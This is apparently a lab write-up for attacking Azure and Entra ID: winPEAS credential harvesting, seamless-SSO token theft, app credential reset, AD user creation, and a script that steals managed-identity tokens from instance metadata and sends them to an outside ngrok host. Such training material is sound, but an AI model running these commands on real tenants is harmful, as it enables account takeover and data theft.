# Azure & Entra ID Blackbox Methodology

## Active Directory Blackbox Lab 1

URL to begin with: `http://20.84.43.1:60137/index.php`. The goal is to recover sensitive information stored in a OneNote belonging to carlos@carloshacktricks.onmicrosoft.com

```sh
iwr -uri 'https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1' -outfile ./winpeas.ps1
```

Found some creds using winpeas:

```txt
C:\Users\Public\ht-student-credentials.txt
Usernames2 triggered
  Domain: HT-DOMAIN
> User: ht-student
  Pass: BlackBoxPassHT.33
Possible Password found: PHP Passwords
C:\Users\Public\ht-student-credentials.txt
PHP Passwords triggered
  Username: HT-DOMAIN\ht-student
> Password: BlackBoxPassHT.33

Possible Password found: Usernames1
C:\Users\Public\ht-student-credentials.txt
Usernames1 triggered
> Username: HT-DOMAIN\ht-student
  Password: BlackBoxPassHT.33
Possible Password found: Simple Passwords1
C:\Users\Public\ht-student-credentials.txt
Simple Passwords1 triggered
  Username: HT-DOMAIN\ht-student
> Password: BlackBoxPassHT.33
     User: ht-student
> Pass: BlackBoxPassHT.33
```

Then we check if seamless SSO is enabled and try to retrieve an access token for the user:

```sh
# Get tenant ID
curl -L "login.microsoftonline.com/carloshacktricks.onmicrosoft.com/.well-known/openid-configuration" | jq

# On rshell
ipconfig
nslookup 10.0.2.1

seamlesspass -tenant carloshacktricks.onmicrosoft.com -domain ht-domain.local -username ht-student -p BlackBoxPassHT.33 -dc dc-ht-domain-lo.internal.cloudapp.net
```

Then from attacker VM (using access token previously obtained):

```sh
./scan-my-privileges-entra.sh user

az ad app credential reset --id 72adac17-1572-4881-8c72-37682b4ad128

# After login with the app, to find specific user (user id found from https://graph.microsoft.com/v1.0/users/ endpoint)
az rest --method GET --url "https://graph.microsoft.com/v1.0/users/86b10631-ff01-4e73-a031-29e505565caa/drive/root/children" | jq -r '.value[] | [.name,.id,.folder.childCount] | @tsv'
az rest --method GET --url "https://graph.microsoft.com/v1.0/users/86b10631-ff01-4e73-a031-29e505565caa/drive/items/01EYDP2CXGAXGWIBK7M5D34FZUZMAR7ZEJ/children" # Using notebook id

# Get graph access token
az account get-access-token --resource microsoft.graph.com --scope .default
curl -L -H "Authorization: Bearer $GRAPH" "https://graph.microsoft.com/v1.0/users/$USER_ID/drive/items/$ITEM_ID/content" -o Flag.one
```

## Active Directory Blackbox Lab 2

Once connected through RDP, enumerate user permissions

```ps1
Import-Module ActiveDirectory

$me = "$($env:USERDOMAIN)\$($env:USERNAME)"

Get-ADOrganizationalUnit -Filter * | ForEach-Object {
    $ouDN = $_.DistinguishedName
    $acl = Get-Acl "AD:$ouDN"
    $acl.Access | Where-Object { "$($_.IdentityReference)" -eq $me } | Select-Object @{
        Name = 'OU'
        Expression = { $ouDN }
    }, IdentityReference, ActiveDirectoryRights, ObjectType, InheritanceType
}
```

We can then create a new user within the TargetUsers OU:

```ps1
$OUdn = (Get-ADOrganizationalUnit -LDAPFilter '(name=TargetUsers)' | Select-Object -First 1 -ExpandProperty DistinguishedName)
$Name="Test Azure"; $Sam="tazure"; $Pwd="P@ssw0rd!"
$UPN="tazure@ht-cloud.local"
New-ADUser -Name $Name -SamAccountName $Sam -UserPrincipalName $UPN -GivenName "Test" -Surname "Azure" -Department "Security" -Path $OUdn -AccountPassword (ConvertTo-SecureString $Pwd -AsPlainText -Force) -Enabled $true
```

To ensure its creation:

```ps1
Get-ADUser tazure -Properties Department | Select SamAccountName, Department
```

Once logged, enumerate dynamic groups:

```sh
az login -u tazure@carloshacktricks.onmicrosoft.com -p 'P@ssw0rd!'
az ad group list --filter "groupTypes/any(c:c eq 'DynamicMembership')" --query "[].{displayName:displayName, rule:membershipRule}" -o table

az resource list
az vm identity show --resource-group Lab2-Cloud-Sync-Desktop --name LAB2-AVD-3b6d0da25a5f

# Can connect on VM which seems to be avd ; check on these endpoints: https://windows365.microsoft.com/ent#/devices ; https://windows.cloud.microsoft/#/apps

# From AVD
$tokenAuthURI = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://management.azure.com/&client_id=2d54fcd9-3f72-49f1-af7f-f224d755a299"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Metadata"="true"} -Uri $tokenAuthURI; $tokenResponse.access_token
$tokenAuthURI = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://vault.azure.net/&client_id=2d54fcd9-3f72-49f1-af7f-f224d755a299"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Metadata"="true"} -Uri $tokenAuthURI; $tokenResponse.access_token

# If copy paste broken
$tokenAuthURI = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://management.azure.com/&client_id=2d54fcd9-3f72-49f1-af7f-f224d755a299"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Metadata"="true"} -Uri $tokenAuthURI; $MGT = $tokenResponse.access_token
$tokenAuthURI = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://graph.microsoft.com/&client_id=2d54fcd9-3f72-49f1-af7f-f224d755a299"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Metadata"="true"} -Uri $tokenAuthURI; $GRH = $tokenResponse.access_token
$tokenAuthURI = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://vault.azure.net/&client_id=2d54fcd9-3f72-49f1-af7f-f224d755a299"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Metadata"="true"} -Uri $tokenAuthURI; $KV = $tokenResponse.access_token
$postParams = @{MGT="$MGT";KV="$KV",GRH="$GRH"}
Invoke-WebRequest -Uri https://defender-avenge-unnoticed.ngrok-free.dev -Method POST -Body ($postParams|ConvertTo-Json) -ContentType "application/json"
```
